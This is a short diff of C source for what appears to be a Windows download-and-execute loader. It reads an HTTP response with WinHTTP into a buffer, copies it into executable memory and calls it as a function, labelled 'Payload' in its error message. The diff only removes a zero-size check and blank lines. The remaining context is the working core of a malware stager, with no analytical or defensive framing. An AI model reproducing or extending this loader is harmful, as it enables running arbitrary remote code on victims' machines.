@@ -68,11 +68,6 @@ int main(void*) {
 				break;
 			}
 
-			if (dwSize == 0)
-			{
-				break;
-			}
-
 			// Allocate space for the buffer.
 			pszOutBuffer = (LPSTR)malloc(dwSize + 1);
 			if (!pszOutBuffer)
@@ -103,11 +98,8 @@ int main(void*) {
 				memcpy(peFile + totalSize, pszOutBuffer, dwDownloaded);
 				totalSize += dwDownloaded;
 			}
-
 			free(pszOutBuffer);
-
 		} while (dwSize > 0);
-
 	}
 
 	if (peFile && totalSize > 0)
@@ -120,7 +112,6 @@ int main(void*) {
 			exit(1);
 		}
 		memcpy(execMem, peFile, totalSize);
-
 		// Define function pointer to that memory
 		void (*func)() = (void(*)())execMem;
 		__try {
@@ -130,10 +121,8 @@ int main(void*) {
 			printf("Payload caused an exception!\n");
 		}
 	}
-
 	if (hRequest) WinHttpCloseHandle(hRequest);
 	if (hConnect) WinHttpCloseHandle(hConnect);
 	if (hSession) WinHttpCloseHandle(hSession);
-
 	return 0;
 }
